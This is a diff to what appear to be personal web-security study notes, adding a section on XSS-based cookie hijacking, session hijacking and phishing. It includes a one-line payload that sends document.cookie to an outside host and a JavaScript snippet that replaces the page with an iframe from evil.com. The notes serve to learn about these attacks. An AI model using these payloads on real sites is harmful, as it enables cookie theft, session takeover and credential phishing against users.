@@ -48,10 +48,64 @@ insecure default configuration, incomplete / ad hoc config, open cloud storage
 
 ## 7. cross site scripting
 
-
 ## 8. insecure deserialization
 ## 9. using components with known vulnerabilities
 ## 10. insufficient logging & monitoring
+
+
+# conventional attack
+SQL injection, command line attack, upload vulnerablility
+
+# XSS injection
+## Cookie hijack
+`document.location="http://www.test.com/cookie.asp?cookie="+document.cookie`
+script to steal cookie data, store somewhere else
+replay attack
+
+## session hijack
+session is based on cookie
+write XSS to server (eg. leave in comment), when admin login to backend to check comment,
+  will trigger XSS loophole
+listen to all http package using some tool, get post data
+
+## phishing (網絡釣魚)
+1. construct fake form
+2. script record down data 
+3. XSS phishing expliot
+```js
+document.body.innerHTML = (
+  '<div style="position:absolute; top:0px; left:0px; width:100%; height:100%;">'+
+  '<iframe src=http://www.evil.com/>phishing.html width=100% height=100%>'+
+  '</iframe></div>'
+);
+```
+### XSS redirect phishing
+### XSS html inject phishing
+### Iframe phishing
+### Flash phishing
+upload flash file to server (eg. fake login frame), then use `<object>/<embed>` to reference flash
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
